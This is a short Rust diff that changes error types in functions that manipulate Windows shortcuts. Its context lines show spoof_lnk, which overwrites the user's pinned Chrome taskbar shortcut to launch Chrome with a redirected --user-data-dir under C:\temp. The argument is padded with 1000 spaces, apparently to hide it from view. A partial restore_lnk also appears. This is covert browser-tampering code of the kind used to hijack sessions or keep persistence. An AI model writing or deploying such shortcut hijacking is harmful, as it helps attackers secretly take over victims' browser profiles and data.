@@ -1,5 +1,5 @@
 use windows::{
-    core::{Interface, Result, PCWSTR}, // Note: `Result` here is `windows::core::Result`
+    core::{Interface, PCWSTR},
     Win32::{
         System::Com::{
             CoCreateInstance, CoInitializeEx, CoUninitialize, CLSCTX_INPROC_SERVER, COINIT_APARTMENTTHREADED, IPersistFile,
@@ -9,7 +9,7 @@ use windows::{
 };
 use widestring::U16CString;
 
-pub fn spoof_lnk(username: &str) -> Result<()> {
+pub fn spoof_lnk(username: &str) -> Result<(), Box<dyn std::error::Error>> {
     let shortcut_path = format!("C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar\\Google Chrome.lnk", username);
     let target_path = "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe";
     let arguments = format!("{}--user-data-dir=\"C:\\temp\\{}\"", " ".repeat(1000), username);
@@ -35,7 +35,7 @@ pub fn spoof_lnk(username: &str) -> Result<()> {
     Ok(())
 }
 
-pub fn restore_lnk(username: &str) -> Result<()> {
+pub fn restore_lnk(username: &str) -> Result<(), Box<dyn std::error::Error>> {
     let shortcut_path = format!("C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar\\Google Chrome.lnk", username);
     let target_path = "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe";
 
